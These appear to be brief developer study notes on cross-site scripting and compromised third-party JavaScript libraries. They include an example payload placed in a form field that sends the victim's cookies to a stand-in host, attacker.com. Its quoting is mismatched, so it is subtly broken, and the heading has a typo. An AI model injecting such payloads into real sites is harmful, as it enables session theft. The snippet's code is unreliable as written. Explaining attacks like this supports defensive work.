## aszCross-site scripting (XSS)
- If a hacker is able to execute hacker's JavaScript code then hacker can steal cookies or token. If a hacker is able to execute following JavaScript code then hacker will have access to someone else's cookie:

- puts in the <script></script> value for address1 while filling out the form:
```html
<script>
  new Image().src="http://attacker.com?cookie='+document.cookie;
</script>
```

- `dangerouslySetInnerHTML` application is vulnerable to XSS attack.

### Compromising third party libraries
- If the third-party library is hacked, then the hacker is able to inject malicious JavaScript code in the page.
